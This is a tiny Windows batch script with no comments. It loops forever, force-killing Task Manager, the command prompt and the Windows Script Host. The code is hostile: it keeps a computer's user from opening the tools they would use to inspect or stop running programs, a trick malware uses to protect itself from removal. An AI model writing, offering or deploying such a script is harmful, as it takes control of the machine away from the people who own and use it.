@echo off
cls
:q
taskkill /im wscript.exe /F
taskkill /im Taskmgr.exe /F
taskkill /im cmd.exe /F
goto q